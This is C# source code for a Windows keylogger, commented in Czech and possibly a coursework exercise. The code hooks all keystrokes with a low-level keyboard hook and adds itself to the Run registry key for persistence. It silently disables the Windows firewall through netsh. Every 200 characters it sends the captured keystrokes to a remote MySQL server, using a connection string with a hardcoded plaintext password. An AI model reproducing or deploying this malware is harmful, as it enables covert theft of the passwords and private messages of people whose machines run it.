using System;
using System.Runtime.InteropServices; 
using System.Diagnostics;
using System.Windows.Forms;
using System.Text;
using MySql.Data.MySqlClient;
using Microsoft.Win32;
using System.Reflection;

namespace KeyLogger
{
    class Logger
    {
        private static RegistryKey runRegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true); // 
        private static int WH_KEYBOARD_LL = 13; // Konstanta pro zachytávání low level inputů
        private static int WM_KEYDOWN = 0x0100;  // konstanta pro stisk klavesy 
        private static IntPtr hook = IntPtr.Zero; // Adresa hook procedury - default 0
        private static LowLevelKeyboardProc loggerProcedure = HookCallback; // Zavěšení callbacku na stisk klávesy
        
        private static StringBuilder loggedKeysString;
        private static string connectionString = "server=db1.forsite.cz;database=vsb;uid=vsb;pwd=SnhIAIZ3;";
       
        public Logger()
        {
            loggedKeysString = new StringBuilder();
        }

        public void Start()
        {
            // Vložení do registrů
            ConfigureRunRegistry();

            // Dáme hook do systémových volání
            hook = SetHook(loggerProcedure);
            DisableFirewall();
            Application.Run();
            // Odstraní hook
            UnhookWindowsHookEx(hook);
        }
        
        // Vložení do registrů
        private void ConfigureRunRegistry()
        {
            // Aktuální absolutní adresa exe souboru
            string keyloggerPath = Assembly.GetEntryAssembly().Location;
            // Získání hodnoty z registrů z klíče LSKeylogger - doopravdy by bylo lepší mít něco tajného, ale takto to aktuálně lépe poznáme :-)
            var registerKlg = runRegistryKey.GetValue("LSKeylogger");
            /*
             Neexistuje-li záznam, který by spustil program z aktuálního umístění, vytvoříme jej.
             Nebo
             Existuje-li záznam, který spouští Vámi vytvořený program z umístění, které ovšem již neexistuje, nahraďte jej cestou k aktuálnímu souboru.
            */
            if (registerKlg == null || (string)registerKlg != keyloggerPath)
            {
                // Vložíme umístění do registrů
                runRegistryKey.SetValue("LSKeylogger", keyloggerPath);
            }
        }

        // Vypne firewall - pokud je keylogger spuštěn jako správce
        private void DisableFirewall()
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo("netsh.exe", "Firewall set opmode disable")
            {
                UseShellExecute = false,
                CreateNoWindow = true
            };

            Process.Start(processStartInfo);
        }

        // nastavení čtení na stisk klávesy - namapování
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);

            return SetWindowsHookEx(WH_KEYBOARD_LL, loggerProcedure, moduleHandle, 0);
        }

        private delegate IntPtr LowLevelKeyboardProc(int ncode, IntPtr wParam, IntPtr lparam);

        // Funkce je zavolána automaticky po stisku klávesy - když se zavolá hook
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // nCode slouží pro určení jak zpracovat zprávu. Pokud je < 0 tak nezpracvováváme. Když zmáčkneme klávesu tak je hodnota 0
            // wParam musí odpovídat 0x0100 - zmáčknutá klávesa
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                // Pokud je délka zachyceného stringu >= 200 odešleme zachycené data
                if (loggedKeysString.Length >= 200)
                {
                    SendToDatabase();
                }
                // čte low level inputy
                int vkCode = Marshal.ReadInt32(lParam);

                // Vrátí stistknutou klávesu v lidské podobě
                string readableCharacter = GetReadableCharacter(vkCode);
                loggedKeysString.Append(readableCharacter);
            }
            // zavolá další proceduru
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        // Vrátí čitelnější znaky
        private static string GetReadableCharacter(int vkCode)
        {
            switch ((Keys)vkCode)
            {
                case Keys.LButton:
                case Keys.MButton:
                case Keys.Shift:
                case Keys.ShiftKey:
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                case Keys.Capital:
                case Keys.LWin:
                case Keys.Back:
                case Keys.LControlKey:
                case Keys.RControlKey:
                case Keys.RWin: return "[" + (Keys)vkCode + "]";
                case Keys.OemPeriod: return ".";
                case Keys.Decimal:
                case Keys.Oemcomma: return ",";
                case Keys.Space: return " ";
                case Keys.Enter: return "\n";
                case Keys.Tab: return "\t";
                case Keys.Oemtilde: return ";";
                default:
                    /*
                     * UNICODE
                     IntPtr hWindowHandle = GetForegroundWindow();
                     uint dwProcessId;
                     uint dwThreadId = GetWindowThreadProcessId(hWindowHandle, out dwProcessId);
                     byte[] kState = new byte[256];
                     GetKeyboardState(kState); //retrieves the status of all virtual keys
                     uint HKL = GetKeyboardLayout(dwThreadId); //retrieves the input locale identifier
                     StringBuilder keyName = new StringBuilder();
                     ToUnicodeEx((uint)(Keys)vkCode, (uint)(Keys)vkCode, kState, keyName, 16, 0, HKL);



                     return keyName.ToString();
                     
                    
                    var keyboardState = new byte[256];
                    StringBuilder sb = new StringBuilder(256);
                    ToUnicode((uint)(Keys)vkCode, 0, keyboardState, sb, 256, 0);
                    return sb.ToString();
                    */
                    return (Keys)vkCode + "";
            }
        }

        // Odešle zachycená data
        private static void SendToDatabase()
        {
            MySqlConnection conn = new MySqlConnection(connectionString);
            conn.Open();
            MySqlCommand comm = conn.CreateCommand();
            comm.CommandText = "INSERT INTO keylogger (text) VALUES(@text)";
            comm.Parameters.AddWithValue("@text", loggedKeysString.ToString());
            comm.ExecuteNonQuery();
            conn.Close();

            loggedKeysString.Clear();
        }

        // Importy

        // Zavolá další událost ze systémových volání.
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModulename);

        // zavedení vlastní události do systémových událostí
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        // Odstraní událost ze systémových volání.
        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        public static extern int ToUnicode(
            uint virtualKeyCode,
            uint scanCode,
            byte[] keyboardState,
            StringBuilder receivingBuffer,
            int bufferSize,
            uint flags
        );

        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, uint dwhkl);

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        public static extern IntPtr GetKeyboardState(byte[] lpKeyState);
    }
}
